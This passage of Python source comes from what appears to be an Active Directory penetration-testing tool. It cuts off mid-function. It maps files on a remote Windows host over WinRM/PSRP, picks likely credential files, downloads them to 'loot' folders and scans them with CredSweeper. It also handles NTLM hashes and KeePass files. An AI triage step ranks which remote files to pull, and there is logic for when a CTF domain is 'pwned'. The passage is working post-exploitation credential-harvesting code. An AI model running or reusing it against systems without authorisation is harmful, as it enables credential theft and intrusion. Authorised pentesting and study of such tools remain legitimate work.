    phase_root_abs = os.path.join(run_root_abs, phase)
    loot_dir = os.path.join(phase_root_abs, "loot")
    os.makedirs(loot_dir, exist_ok=True)

    if phase in {
        SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
        SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
    }:
        phase_extensions = get_sensitive_file_extensions(str(phase_definition.get("profile", "")))
        selected_entries = WinRMFileMappingService.select_entries_by_extensions(
            entries=entries,
            extensions=phase_extensions,
        )
    else:
        phase_extensions = get_sensitive_phase_extensions(phase)
        selected_entries = WinRMFileMappingService.select_entries_by_extensions(
            entries=entries,
            extensions=phase_extensions,
        )
    selected_entries, phase_exclusion_reason_counts, phase_excluded_preview = (
        _apply_winrm_phase_candidate_exclusions(
            phase=phase,
            entries=selected_entries,
        )
    )
    phase_excluded_total = sum(phase_exclusion_reason_counts.values())

    print_info(
        "Running deterministic WinRM analysis "
        f"({mark_sensitive(phase_label, 'text')}) on "
        f"{mark_sensitive(host, 'hostname')}."
    )
    if phase_excluded_total:
        preview = ", ".join(mark_sensitive(path, "path") for path in phase_excluded_preview)
        remaining = phase_excluded_total - min(phase_excluded_total, len(phase_excluded_preview))
        remaining_suffix = f", +{remaining} more" if remaining > 0 else ""
        print_info_debug(
            "WinRM phase candidate exclusions applied: "
            f"phase={phase} label={mark_sensitive(phase_label, 'text')} "
            f"excluded={phase_excluded_total} "
            f"reasons={phase_exclusion_reason_counts} "
            f"path_prefixes={[mark_sensitive(item, 'path') for item in get_winrm_phase_excluded_path_prefixes(phase)]} "
            f"path_fragments={[mark_sensitive(item, 'path') for item in get_winrm_phase_excluded_path_fragments(phase)]} "
            f"file_names={list(get_winrm_phase_excluded_file_names(phase))} "
            f"preview=[{rich_escape(preview)}{rich_escape(remaining_suffix)}]"
        )
    if not selected_entries:
        print_info(f"No WinRM candidates matched phase {mark_sensitive(phase_label, 'text')}.")
        print_info_debug(
            "WinRM phase candidate selection returned no matches: "
            f"phase={phase} label={mark_sensitive(phase_label, 'text')} "
            f"extensions={list(phase_extensions)} total_mapped_entries={len(entries)} "
            f"phase_excluded_candidates={phase_excluded_total} "
            f"phase_exclusion_reasons={phase_exclusion_reason_counts}"
        )
        return {
            "completed": True,
            "credential_findings": 0,
            "artifact_hits": 0,
            "files_with_findings": 0,
            "candidate_files": 0,
            "phase_excluded_candidates": phase_excluded_total,
            "phase": phase,
            "loot_dir": loot_dir,
        }

    service = _build_winrm_psrp_service(
        domain=domain,
        host=host,
        username=username,
        password=password,
    )
    fetch_started_at = time.perf_counter()
    fetch_result = _fetch_winrm_phase_files(
        service=service,
        selected_entries=selected_entries,
        loot_dir=loot_dir,
        workspace_type=str(getattr(shell, "type", "") or "").strip().lower() or None,
    )
    downloaded_files = fetch_result.downloaded_files
    fetch_duration_seconds = time.perf_counter() - fetch_started_at
    fetch_report_path = _persist_winrm_phase_fetch_report(
        phase_root_abs=phase_root_abs,
        fetch_result=fetch_result,
    )
    fetch_skip_summary = _summarize_winrm_fetch_skip_reasons(
        list(fetch_result.skipped_files or []) + list(fetch_result.per_file_failures or [])
    )
    if fetch_result.auth_invalid_abort:
        print_warning(
            "Deterministic WinRM phase aborted early because the WinRM credentials "
            "became invalid during the fetch stage."
        )
        return {
            "completed": False,
            "aborted_due_to_auth_invalid": True,
            "auth_invalid_reason": fetch_result.auth_invalid_reason,
            "candidate_files": len(selected_entries),
            "phase_excluded_candidates": phase_excluded_total,
            "fetched_files": len(downloaded_files),
            "fetch_seconds": float(fetch_duration_seconds),
            "fetch_report_path": fetch_report_path,
            "phase": phase,
            "loot_dir": loot_dir,
        }

    if phase in {
        SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
        SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
    }:
        credsweeper_path = str(getattr(shell, "credsweeper_path", "") or "").strip()
        if not credsweeper_path:
            print_warning("CredSweeper is not configured; skipping WinRM credential scan.")
            return {"completed": False, "credential_findings": 0, "phase": phase}
        analysis_started_at = time.perf_counter()
        analysis_result = run_loot_credential_analysis(
            shell,
            domain=domain,
            loot_dir=loot_dir,
            phase=phase,
            phase_label=phase_label,
            candidate_files=len(downloaded_files),
            analysis_context={
                "ai_configured": False,
                "credential_analysis_engine_by_phase": {phase: ENGINE_CREDSWEEPER},
            },
            ai_history_path="",
            credsweeper_path=credsweeper_path,
            credsweeper_output_dir=os.path.join(phase_root_abs, "credsweeper"),
            jobs=get_default_credsweeper_jobs(),
            credsweeper_findings=None,
        )
        findings = dict(analysis_result.findings)
        structured_stats = shell._get_spidering_service().process_local_structured_files(
            root_path=loot_dir,
            phase=phase,
            domain=domain,
            source_hosts=[host],
            source_shares=["winrm"],
            auth_username=username,
            apply_actions=True,
        )
        analysis_duration_seconds = time.perf_counter() - analysis_started_at
        total_findings, files_with_findings = _count_grouped_credential_findings(findings)
        structured_files_with_findings = int(
            structured_stats.get("files_with_findings", 0) or 0
        )
        ntlm_hash_findings = structured_stats.get("ntlm_hash_findings")
        if findings:
            shell.handle_found_credentials(
                findings,
                domain,
                source_hosts=[host],
                source_shares=["winrm"],
                auth_username=username,
                source_artifact="winrm deterministic file scan",
            )
        loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
        if isinstance(ntlm_hash_findings, list) and ntlm_hash_findings:
            render_ntlm_hash_findings_flow(
                shell,
                domain=domain,
                loot_dir=loot_dir,
                loot_rel=loot_rel,
                phase_label=phase_label,
                ntlm_hash_findings=[
                    item for item in ntlm_hash_findings if isinstance(item, dict)
                ],
                source_scope=f"WinRM file NTLM hash findings from {phase_label}",
                fallback_source_hosts=[host],
                fallback_source_shares=["winrm"],
            )
        print_info(
            "Deterministic WinRM phase summary: "
            f"phase={mark_sensitive(phase_label, 'text')} "
            f"candidate_files={len(selected_entries)} "
            f"phase_excluded_candidates={phase_excluded_total} "
            f"fetched_files={len(downloaded_files)} "
            f"fetch_seconds={fetch_duration_seconds:.2f} "
            f"analysis_seconds={analysis_duration_seconds:.2f} "
            f"fetch_skipped_access_denied={fetch_skip_summary['access_denied']} "
            f"fetch_skipped_file_in_use={fetch_skip_summary['file_in_use']} "
            f"fetch_skipped_other={fetch_skip_summary['other']} "
            f"files_with_findings={files_with_findings + structured_files_with_findings} "
            f"credential_like_findings={total_findings} "
            f"loot={mark_sensitive(loot_rel, 'path')} "
            f"fetch_report={mark_sensitive(os.path.relpath(fetch_report_path, shell._get_workspace_cwd()), 'path')}"
        )
        if not findings and structured_files_with_findings == 0:
            render_no_extracted_findings_preview(
                loot_dir=loot_dir,
                loot_rel=loot_rel,
                analyzed_count=len(downloaded_files),
                category="credential",
                phase_label=phase_label,
                preview_limit=5,
            )
        return {
            "completed": True,
            "credential_findings": int(total_findings),
            "files_with_findings": int(files_with_findings + structured_files_with_findings),
            "candidate_files": len(selected_entries),
            "phase_excluded_candidates": phase_excluded_total,
            "fetched_files": len(downloaded_files),
            "fetch_seconds": float(fetch_duration_seconds),
            "analysis_seconds": float(analysis_duration_seconds),
            "fetch_report_path": fetch_report_path,
            "phase": phase,
            "loot_dir": loot_dir,
        }

    spidering_service = shell._get_spidering_service()
    analysis_started_at = time.perf_counter()
    artifact_records: list[ArtifactProcessingRecord] = []
    for file_path in _list_files_under_path(loot_dir):
        artifact_records.append(
            spidering_service.process_found_file(
                file_path,
                domain,
                "ext",
                source_hosts=[host],
                source_shares=["winrm"],
                auth_username=username,
                enable_legacy_zip_callbacks=False,
                apply_actions=True,
            )
        )
    analysis_duration_seconds = time.perf_counter() - analysis_started_at
    if artifact_records:
        report_path = _persist_winrm_artifact_processing_report(
            phase_root_abs=phase_root_abs,
            records=artifact_records,
        )
        _render_winrm_artifact_processing_summary(
            shell,
            phase_label=phase_label,
            records=artifact_records,
            report_path=report_path,
        )
        if artifact_records_extracted_nothing(artifact_records):
            render_no_extracted_findings_preview(
                loot_dir=loot_dir,
                loot_rel=os.path.relpath(loot_dir, shell._get_workspace_cwd()),
                analyzed_count=len(downloaded_files),
                category="artifact",
                phase_label=phase_label,
                preview_limit=5,
            )
    elif downloaded_files:
        render_no_extracted_findings_preview(
            loot_dir=loot_dir,
            loot_rel=os.path.relpath(loot_dir, shell._get_workspace_cwd()),
            analyzed_count=len(downloaded_files),
            category="artifact",
            phase_label=phase_label,
            preview_limit=5,
        )
    print_info(
        "Deterministic WinRM artifact summary: "
        f"phase={mark_sensitive(phase_label, 'text')} "
        f"candidate_files={len(selected_entries)} "
        f"phase_excluded_candidates={phase_excluded_total} "
        f"fetched_files={len(downloaded_files)} "
        f"fetch_seconds={fetch_duration_seconds:.2f} "
        f"analysis_seconds={analysis_duration_seconds:.2f} "
        f"fetch_skipped_access_denied={fetch_skip_summary['access_denied']} "
        f"fetch_skipped_file_in_use={fetch_skip_summary['file_in_use']} "
        f"fetch_skipped_other={fetch_skip_summary['other']} "
        f"artifact_hits={len(artifact_records)} "
        f"loot={mark_sensitive(os.path.relpath(loot_dir, shell._get_workspace_cwd()), 'path')} "
        f"fetch_report={mark_sensitive(os.path.relpath(fetch_report_path, shell._get_workspace_cwd()), 'path')}"
    )
    return {
        "completed": True,
        "artifact_hits": len(artifact_records),
        "candidate_files": len(selected_entries),
        "phase_excluded_candidates": phase_excluded_total,
        "fetched_files": len(downloaded_files),
        "fetch_seconds": float(fetch_duration_seconds),
        "analysis_seconds": float(analysis_duration_seconds),
        "fetch_report_path": fetch_report_path,
        "phase": phase,
        "loot_dir": loot_dir,
    }


def _fetch_winrm_phase_files(
    *,
    service: WinRMPSRPService,
    selected_entries: list[WinRMFileMapEntry],
    loot_dir: str,
    workspace_type: str | None = None,
    batch_threshold: int = 8,
) -> WinRMPhaseFetchResult:
    """Fetch WinRM candidates with batch staging when the candidate set is large."""
    file_targets = [
        (
            entry.full_name,
            WinRMFileMappingService.build_local_relative_path(entry.full_name),
        )
        for entry in selected_entries
    ]
    if not file_targets:
        return WinRMPhaseFetchResult(downloaded_files=[])

    if len(file_targets) >= batch_threshold:
        print_info_debug(
            "WinRM PSRP batch fetch selected: "
            f"targets={len(file_targets)} threshold={batch_threshold}"
        )
        try:
            batch_result = service.fetch_files_batched(
                files=file_targets,
                download_dir=loot_dir,
            )
            if batch_result.skipped_files:
                skipped_summary = _summarize_winrm_fetch_skip_reasons(batch_result.skipped_files)
                preview = ", ".join(
                    mark_sensitive(path, "path")
                    for path, _reason in batch_result.skipped_files[:3]
                )
                remaining = len(batch_result.skipped_files) - min(len(batch_result.skipped_files), 3)
                remaining_suffix = f", +{remaining} more" if remaining > 0 else ""
                print_warning(
                    "WinRM PSRP batch fetch skipped inaccessible files but continued: "
                    f"staged={batch_result.staged_file_count} skipped={len(batch_result.skipped_files)} "
                    f"access_denied={skipped_summary['access_denied']} "
                    f"file_in_use={skipped_summary['file_in_use']} "
                    f"other={skipped_summary['other']} "
                    f"preview=[{rich_escape(preview)}{rich_escape(remaining_suffix)}]"
                )
            else:
                print_info_debug(
                    "WinRM PSRP batch fetch completed successfully: "
                    f"staged={batch_result.staged_file_count}"
                )
            return WinRMPhaseFetchResult(
                downloaded_files=batch_result.downloaded_files,
                staged_file_count=batch_result.staged_file_count,
                skipped_files=list(batch_result.skipped_files),
                batch_used=True,
            )
        except WinRMPSRPError as exc:
            if workspace_type == "ctf" and _is_winrm_ctf_auth_invalid_error(str(exc)):
                reason = (
                    "WinRM credentials became invalid during this CTF flow. "
                    "Skipping remaining fetches for this phase because subsequent "
                    f"PSRP downloads would fail with the same authentication error: {exc}"
                )
                print_warning(reason)
                return WinRMPhaseFetchResult(
                    downloaded_files=[],
                    batch_used=True,
                    auth_invalid_abort=True,
                    auth_invalid_reason=reason,
                )
            print_warning(
                "WinRM PSRP batch staging failed; falling back to per-file fetch. "
                "This does not abort the scan, but individual locked files may still warn separately: "
                f"{exc}"
            )

    downloaded_files: list[str] = []
    per_file_failures: list[tuple[str, str]] = []
    for remote_path, relative_path in file_targets:
        save_path = os.path.join(loot_dir, relative_path)
        try:
            downloaded_files.append(service.fetch_file(remote_path, save_path))
        except WinRMPSRPError as exc:
            if workspace_type == "ctf" and _is_winrm_ctf_auth_invalid_error(str(exc)):
                reason = (
                    "WinRM credentials became invalid during this CTF flow. "
                    "Aborting remaining per-file fetches for this phase to avoid repeated "
                    f"authentication failures: {exc}"
                )
                print_warning(reason)
                return WinRMPhaseFetchResult(
                    downloaded_files=downloaded_files,
                    batch_used=len(file_targets) >= batch_threshold,
                    batch_fallback=len(file_targets) >= batch_threshold,
                    per_file_failures=per_file_failures,
                    auth_invalid_abort=True,
                    auth_invalid_reason=reason,
                )
            per_file_failures.append((remote_path, str(exc)))
            print_warning(
                "WinRM file fetch failed for "
                f"{mark_sensitive(remote_path, 'path')}: {exc}"
            )
    return WinRMPhaseFetchResult(
        downloaded_files=downloaded_files,
        batch_used=len(file_targets) >= batch_threshold,
        batch_fallback=len(file_targets) >= batch_threshold,
        per_file_failures=per_file_failures,
    )


def _build_winrm_ai_mapping_json(*, host: str, entries: list[WinRMFileMapEntry]) -> str:
    """Build a synthetic share-map JSON payload for WinRM AI triage."""
    files: dict[str, dict[str, str]] = {}
    for entry in entries:
        full_name = str(entry.full_name or "").strip()
        if not full_name:
            continue
        size = int(entry.length or 0)
        files[full_name] = {"size": f"{size} B"}
    payload = {
        "hosts": {
            str(host).strip(): {
                "shares": {
                    "winrm": {
                        "files": files,
                    }
                }
            }
        }
    }
    return json.dumps(payload, ensure_ascii=False, separators=(",", ":"))


def _persist_winrm_prioritized_artifact_bytes(
    *,
    shell: Any,
    domain: str,
    host: str,
    remote_path: str,
    file_bytes: bytes,
) -> str:
    """Persist one AI-prioritized WinRM artifact into the workspace."""
    from adscan_internal.workspaces import domain_subpath

    workspace_cwd = shell._get_workspace_cwd()
    filename = Path(remote_path or "artifact.bin").name or "artifact.bin"
    artifact_root = domain_subpath(
        workspace_cwd,
        shell.domains_dir,
        domain,
        "winrm",
        "ai_prioritized_artifacts",
        re.sub(r"[^A-Za-z0-9._-]+", "_", str(host).strip() or "unknown_host"),
    )
    os.makedirs(artifact_root, exist_ok=True)
    target_path = os.path.join(artifact_root, filename)
    with open(target_path, "wb") as handle:
        handle.write(file_bytes)
    print_info_debug(
        "Persisted prioritized WinRM artifact bytes: "
        f"path={mark_sensitive(target_path, 'path')}"
    )
    return target_path


def _should_continue_after_winrm_ai_findings(*, shell: Any, domain: str) -> bool:
    """Prompt once to continue after WinRM AI findings unless CTF domain is pwned."""
    if _is_ctf_domain_pwned(shell, domain):
        print_info_debug(
            "Skipping WinRM AI continue-after-findings prompt because the CTF domain "
            f"is already pwned: domain={mark_sensitive(domain, 'domain')}"
        )
        return False
    from adscan_internal.cli.smb import _confirm_continue_after_findings

    return _confirm_continue_after_findings(shell=shell)


def _run_winrm_ai_sensitive_data_scan(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    entries: list[WinRMFileMapEntry],
    run_root_abs: str,
) -> dict[str, Any]:
    """Run AI-assisted sensitive-data analysis over a cached WinRM manifest."""
    from adscan_internal.cli.smb import (
        _handle_prioritized_findings_actions,
        _render_ai_triage_prioritization_summary,
        _render_file_credentials_table,
        _select_post_mapping_ai_scope,
    )
    from adscan_internal.services.share_file_analysis_pipeline_service import ShareFileAnalysisPipelineService
    from adscan_internal.services.share_file_analyzer_service import ShareFileAnalyzerService
    from adscan_internal.services.share_file_content_extraction_service import ShareFileContentExtractionService
    from adscan_internal.services.share_credential_provenance_service import ShareCredentialProvenanceService
    from adscan_internal.services.share_map_ai_triage_service import ShareMapAITriageService

    ai_service = shell._get_ai_service()
    if ai_service is None:
        print_warning("AI service is not available; skipping WinRM AI analysis.")
        return {"completed": False, "error": "ai_service_unavailable"}

    scope = _select_post_mapping_ai_scope(shell)
    if scope is None:
        print_info("WinRM AI analysis skipped by user.")
        return {"completed": False, "skipped": True}

    triage_service = ShareMapAITriageService()
    mapping_json = _build_winrm_ai_mapping_json(host=host, entries=entries)
    print_info_debug(
        f"WinRM AI triage manifest prepared: host={mark_sensitive(host, 'hostname')} chars={len(mapping_json)}"
    )
    response = ai_service.ask_once(
        triage_service.build_triage_prompt(
            domain=domain,
            search_scope=scope,
            mapping_json=mapping_json,
        ),
        allow_cli_actions=False,
    )
    triage_parse = triage_service.parse_triage_response(response_text=response)
    prioritized_files = triage_parse.prioritized_files
    _render_ai_triage_prioritization_summary(
        shell,
        prioritized_files=prioritized_files,
        total_files=triage_service.count_total_file_entries(mapping_json=mapping_json),
    )
    if not prioritized_files:
        print_warning("WinRM AI triage did not return valid prioritized files.")
        return {"completed": False, "error": "no_priority_files"}
    if _is_ctf_domain_pwned(shell, domain):
        print_info("Skipping WinRM AI prioritized file inspection because the CTF domain is already pwned.")
        return {"completed": False, "skipped": True, "reason": "ctf_domain_pwned"}
    if not Confirm.ask(
        "Do you want AI to inspect these prioritized WinRM files?",
        default=True,
    ):
        print_info("WinRM AI prioritized file inspection cancelled by user.")
        return {"completed": False, "skipped": True}

    entry_index = {
        str(entry.full_name).strip().lower(): entry
        for entry in entries
        if str(entry.full_name).strip()
    }
    selected_entries: list[WinRMFileMapEntry] = []
    for candidate in prioritized_files:
        match = entry_index.get(str(getattr(candidate, 'path', '')).strip().lower())
        if match is not None:
            selected_entries.append(match)
    if not selected_entries:
        print_warning("WinRM AI triage selected files that were not present in the current manifest.")
        return {"completed": False, "error": "priority_files_not_in_manifest"}

    phase_root_abs = os.path.join(run_root_abs, 'ai_prioritized')
    loot_dir = os.path.join(phase_root_abs, 'loot')
    os.makedirs(loot_dir, exist_ok=True)
    fetch_started_at = time.perf_counter()
    fetch_result = _fetch_winrm_phase_files(
        service=_build_winrm_psrp_service(
            domain=domain,
            host=host,
            username=username,
            password=password,
        ),
        selected_entries=selected_entries,
        loot_dir=loot_dir,
        workspace_type=str(getattr(shell, 'type', '') or '').strip().lower() or None,
    )
    fetch_duration_seconds = time.perf_counter() - fetch_started_at
    fetch_report_path = _persist_winrm_phase_fetch_report(
        phase_root_abs=phase_root_abs,
        fetch_result=fetch_result,
    )
    if fetch_result.auth_invalid_abort:
        print_warning(
            "WinRM AI analysis aborted because the WinRM credentials became invalid during file fetch."
        )
        return {
            'completed': False,
            'aborted_due_to_auth_invalid': True,
            'auth_invalid_reason': fetch_result.auth_invalid_reason,
            'fetch_report_path': fetch_report_path,
        }

    pipeline_service = ShareFileAnalysisPipelineService(
        analyzer_service=ShareFileAnalyzerService(
            command_executor=getattr(shell, 'run_command', None),
            pypykatz_path=getattr(shell, 'pypykatz_path', None),
        ),
        extraction_service=ShareFileContentExtractionService(),
    )
    provenance_service = ShareCredentialProvenanceService()
    max_bytes = 10 * 1024 * 1024
    analyzed = 0
    deterministic_handled = 0
    deterministic_findings = 0
    read_failures = 0
    flagged_files = 0
    flagged_credentials = 0
    review_candidate_paths: list[str] = []
    continue_after_findings: bool | None = None
    analysis_started_at = time.perf_counter()
    for candidate in prioritized_files:
        remote_path = str(getattr(candidate, 'path', '') or '').strip()
        local_path = os.path.join(loot_dir, WinRMFileMappingService.build_local_relative_path(remote_path))
        if not os.path.isfile(local_path):
            read_failures += 1
            print_warning_debug(
                "WinRM AI prioritized file missing from fetched loot: "
                f"path={mark_sensitive(remote_path, 'path')}"
            )
            continue
        file_bytes = Path(local_path).read_bytes()
        pipeline_result = pipeline_service.analyze_from_bytes(
            domain=domain,
            scope=scope,
            candidate=candidate,
            source_path=remote_path,
            file_bytes=file_bytes,
            truncated=False,
            max_bytes=max_bytes,
            triage_service=triage_service,
            ai_service=ai_service,
        )
        if pipeline_result.deterministic_handled:
            deterministic_handled += 1
            if pipeline_result.deterministic_findings:
                keepass_findings = [
                    finding
                    for finding in pipeline_result.deterministic_findings
                    if str(getattr(finding, 'credential_type', '') or '').strip().lower() == 'keepass_artifact'
                ]
                if keepass_findings:
                    persisted_artifact = _persist_winrm_prioritized_artifact_bytes(
                        shell=shell,
                        domain=domain,
                        host=host,
                        remote_path=remote_path,
                        file_bytes=file_bytes,
                    )
                    try:
                        extracted_entries = int(
                            shell._process_keepass_artifact(
                                domain,
                                persisted_artifact,
                                [host],
                                ['winrm'],
                                username,
                            ) or 0
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                        extracted_entries = 0
                        print_warning(
                            f"Could not process KeePass artifact {mark_sensitive(remote_path, 'path')} deterministically."
                        )
                        print_exception(exception=exc)
                    finding_count = max(1, extracted_entries)
                    deterministic_findings += finding_count
                    flagged_files += 1
                    flagged_credentials += finding_count
                else:
                    deterministic_findings += len(pipeline_result.deterministic_findings)
                    flagged_files += 1
                    flagged_credentials += len(pipeline_result.deterministic_findings)
                    _render_file_credentials_table(
                        shell,
                        candidate=candidate,
                        findings=pipeline_result.deterministic_findings,
                        source_label='Deterministic',
                    )
                    if not _handle_prioritized_findings_actions(
                        shell=shell,
                        domain=domain,
                        candidate=candidate,
                        findings=pipeline_result.deterministic_findings,
                        auth_username=username,
                        provenance_service=provenance_service,
                    ):
                        continue_after_findings = False
                    if continue_after_findings is None:
                        continue_after_findings = _should_continue_after_winrm_ai_findings(shell=shell, domain=domain)
                    if continue_after_findings is False:
                        break
            else:
                review_candidate_paths.append(f"{host}/winrm/{remote_path}")
        if pipeline_result.error_message:
            read_failures += 1
            print_warning_debug(
                "WinRM AI extraction failure: "
                f"path={mark_sensitive(remote_path, 'path')} error={pipeline_result.error_message}"
            )
            continue
        if pipeline_result.ai_attempted:
            analyzed += 1
            if pipeline_result.ai_summary:
                print_info(f"AI summary for {mark_sensitive(remote_path, 'path')}: {pipeline_result.ai_summary}")
            if pipeline_result.ai_findings:
                flagged_files += 1
                flagged_credentials += len(pipeline_result.ai_findings)
                _render_file_credentials_table(
                    shell,
                    candidate=candidate,
                    findings=pipeline_result.ai_findings,
                    source_label='AI',
                )
                if not _handle_prioritized_findings_actions(
                    shell=shell,
                    domain=domain,
                    candidate=candidate,
                    findings=pipeline_result.ai_findings,
                    auth_username=username,
                    provenance_service=provenance_service,
                ):
                    continue_after_findings = False
                if continue_after_findings is None:
                    continue_after_findings = _should_continue_after_winrm_ai_findings(shell=shell, domain=domain)
                if continue_after_findings is False:
                    break
            else:
                review_candidate_paths.append(f"{host}/winrm/{remote_path}")
    analysis_duration_seconds = time.perf_counter() - analysis_started_at
    if flagged_files == 0 and review_candidate_paths:
        render_no_extracted_findings_preview(
            loot_dir=loot_dir,
            loot_rel=os.path.relpath(loot_dir, shell._get_workspace_cwd()),
            analyzed_count=len(review_candidate_paths),
            category="mixed",
            phase_label="AI prioritized file analysis",
            candidate_paths=review_candidate_paths,
            report_root_abs=phase_root_abs,
            scope_label="AI prioritized WinRM files",
            preview_limit=5,
        )
    print_info(
        "WinRM AI analysis summary: "
        f"prioritized_files={len(prioritized_files)} analyzed={analyzed} deterministic_handled={deterministic_handled} "
        f"deterministic_findings={deterministic_findings} read_failures={read_failures} files_with_findings={flagged_files} "
        f"credential_like_findings={flagged_credentials} fetch_seconds={fetch_duration_seconds:.2f} analysis_seconds={analysis_duration_seconds:.2f} "
        f"loot={mark_sensitive(os.path.relpath(loot_dir, shell._get_workspace_cwd()), 'path')} "
        f"fetch_report={mark_sensitive(os.path.relpath(fetch_report_path, shell._get_workspace_cwd()), 'path')}"
    )
    return {
        'completed': True,
        'prioritized_files': len(prioritized_files),
        'analyzed': analyzed,
        'files_with_findings': flagged_files,
        'credential_like_findings': flagged_credentials,
        'fetch_seconds': float(fetch_duration_seconds),
        'analysis_seconds': float(analysis_duration_seconds),
        'fetch_report_path': fetch_report_path,
        'loot_dir': loot_dir,
    }


def run_winrm_sensitive_data_scan(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> dict[str, Any]:
    """Run deterministic sensitive-data analysis over WinRM using PSRP mapping."""
    from adscan_internal.workspaces import DEFAULT_DOMAIN_LAYOUT, domain_relpath, domain_subpath

    if _should_skip_winrm_followup_for_ctf_pwned(
        shell=shell,
        domain=domain,
        action_label="sensitive_data_scan",
    ):
        print_info(
            "Skipping WinRM sensitive-data analysis because the CTF domain is already pwned."
        )
        return {
            "completed": False,
            "skipped": True,
            "reason": "ctf_domain_pwned",
        }

    from adscan_internal.services.ai_backend_availability_service import AIBackendAvailabilityService

    availability = AIBackendAvailabilityService().get_availability()
    print_info_debug(
        "WinRM AI availability: "
        f"configured={availability.configured} enabled={availability.enabled} "
        f"provider={availability.provider} reason={availability.reason}"
    )
    method = _select_winrm_sensitive_data_method(shell, ai_configured=availability.configured)
    if method == "skip":
        print_info("WinRM sensitive-data analysis skipped by user.")
        return {"completed": False, "skipped": True}

    workspace_cwd = (
        shell._get_workspace_cwd()
        if callable(getattr(shell, "_get_workspace_cwd", None))
        else os.getcwd()
    )
    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    root_strategy = WINRM_ROOT_STRATEGY_AUTO
    workspace_type = str(getattr(shell, "type", "") or "").strip().lower() or "audit"
    run_folder = f"{run_id}_{username}_{root_strategy}".replace("\\", "_").replace("/", "_")
    run_root_abs = domain_subpath(
        workspace_cwd,
        shell.domains_dir,
        domain,
        DEFAULT_DOMAIN_LAYOUT.winrm,
        "sensitive",
        run_folder,
        "phases",
    )
    os.makedirs(run_root_abs, exist_ok=True)
    mapping_service = WinRMFileMappingService()
    excluded_path_prefixes = get_winrm_excluded_path_prefixes()
    excluded_directory_names = get_winrm_excluded_directory_names()
    cache_manifest_abs, cache_manifest_rel = _get_winrm_mapping_cache_paths(
        shell,
        workspace_cwd=workspace_cwd,
        domain=domain,
        host=host,
        username=username,
        root_strategy=root_strategy,
    )
    expected_cache_metadata = _build_winrm_mapping_cache_metadata(
        host=host,
        domain=domain,
        username=username,
        workspace_type=workspace_type,
        root_strategy=root_strategy,
        excluded_path_prefixes=excluded_path_prefixes,
        excluded_directory_names=excluded_directory_names,
    )
    mapping_mode = _resolve_winrm_mapping_mode(shell)
    if method == "ai":
        print_info(
            "AI WinRM backend: "
            f"{mark_sensitive('psrp', 'text')} | Roots: {mark_sensitive(root_strategy, 'text')}."
        )
    else:
        print_info(
            "Deterministic WinRM backend: "
            f"{mark_sensitive('psrp', 'text')} | Roots: {mark_sensitive(root_strategy, 'text')}."
        )
    print_info_debug(
        "WinRM deterministic discovery policy: "
        f"mapping_mode={mark_sensitive(mapping_mode, 'text')} "
        f"strategy={mark_sensitive(root_strategy, 'text')} "
        f"excluded_prefixes={[mark_sensitive(item, 'path') for item in excluded_path_prefixes]} "
        f"excluded_directory_names={[mark_sensitive(item, 'path') for item in excluded_directory_names]}"
    )
    mapping_result: dict[str, object]
    mapping_duration_seconds = 0.0
    cache_reused = False
    cache_age_seconds: float | None = None
    should_attempt_cache_reuse = mapping_mode == _WINRM_MAPPING_MODE_REUSE or (
        mapping_mode == _WINRM_MAPPING_MODE_AUTO and workspace_type == "ctf"
    )
    if should_attempt_cache_reuse and os.path.exists(cache_manifest_abs):
        try:
            cached_mapping = mapping_service.load_file_map(input_path=cache_manifest_abs)
            cache_compatible, cache_reason = _is_winrm_mapping_cache_compatible(
                cache_payload=cached_mapping,
                expected_metadata=expected_cache_metadata,
            )
            cache_age_seconds = _resolve_winrm_mapping_cache_age_seconds(
                str(cached_mapping.get("generated_at") or "")
            )
            cache_fresh_enough = (
                cache_age_seconds is not None
                and cache_age_seconds <= _WINRM_MAPPING_CACHE_MAX_AGE_CTF.total_seconds()
            )
            if (
                cache_compatible
                and (
                    mapping_mode == _WINRM_MAPPING_MODE_REUSE
                    or (
                        mapping_mode == _WINRM_MAPPING_MODE_AUTO
                        and workspace_type == "ctf"
                        and cache_fresh_enough
                    )
                )
            ):
                mapping_result = cached_mapping
                cache_reused = True
                age_label = (
                    f"{cache_age_seconds:.0f}s old"
                    if cache_age_seconds is not None
                    else "age unknown"
                )
                if mapping_mode == _WINRM_MAPPING_MODE_REUSE:
                    print_info(
                        "Using cached WinRM mapping from "
                        f"{mark_sensitive(cache_manifest_rel, 'path')} "
                        f"({len(list(mapping_result.get('entries') or []))} file entries, "
                        f"{age_label}) because reuse was forced."
                    )
                else:
                    print_info(
                        "Using cached WinRM mapping from "
                        f"{mark_sensitive(cache_manifest_rel, 'path')} "
                        f"({len(list(mapping_result.get('entries') or []))} file entries, "
                        f"{age_label})."
                    )
            else:
                print_info_debug(
                    "Cached WinRM mapping not reused: "
                    f"path={mark_sensitive(cache_manifest_rel, 'path')} "
                    f"reason={mark_sensitive(cache_reason, 'text')} "
                    f"age_seconds={cache_age_seconds if cache_age_seconds is not None else 'unknown'} "
                    f"mapping_mode={mark_sensitive(mapping_mode, 'text')}"
                )
                raise FileNotFoundError("refresh mapping")
        except Exception:
            mapping_started_at = time.perf_counter()
            try:
                mapping_result = mapping_service.generate_file_map(
                    psrp_service=_build_winrm_psrp_service(
                        domain=domain,
                        host=host,
                        username=username,
                        password=password,
                    ),
                    output_path=cache_manifest_abs,
                    excluded_path_prefixes=excluded_path_prefixes,
                    excluded_directory_names=excluded_directory_names,
                    metadata=expected_cache_metadata,
                )
            except WinRMPSRPError as exc:
                print_error(f"WinRM PSRP mapping failed: {exc}")
                return {"completed": False, "error": str(exc)}
            mapping_duration_seconds = time.perf_counter() - mapping_started_at
    else:
        if mapping_mode == _WINRM_MAPPING_MODE_REFRESH and os.path.exists(cache_manifest_abs):
            print_info(
                "Cached WinRM mapping exists at "
                f"{mark_sensitive(cache_manifest_rel, 'path')}, but refresh mode forces a new mapping."
            )
        elif workspace_type == "audit" and os.path.exists(cache_manifest_abs):
            print_info(
                "Cached WinRM mapping exists at "
                f"{mark_sensitive(cache_manifest_rel, 'path')}, but audit mode refreshes mappings by default."
            )
        mapping_started_at = time.perf_counter()
        try:
